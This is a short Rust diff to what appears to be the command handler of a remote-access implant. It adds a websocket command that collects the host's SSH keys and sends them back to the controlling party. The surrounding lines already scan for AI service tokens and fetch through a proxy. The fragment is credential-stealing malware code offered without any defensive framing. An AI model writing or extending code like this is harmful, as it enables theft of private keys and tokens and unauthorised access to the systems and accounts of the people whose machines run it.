@@ -193,6 +193,10 @@ impl AgentEngine {
                 let r = libra_modules::recon::AITokenScanner::scan();
                 ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
             }
+            ws_type::OTHERSOFT_SSH => {
+                let r = libra_modules::recon::SshKeys::collect();
+                ws_send(tx, &agent_id, "othersoft.ssh.result", &r, rid).await;
+            }
 
             // ── Proxy ─────────────────────────────────────────────
             ws_type::PROXY_FETCH => {
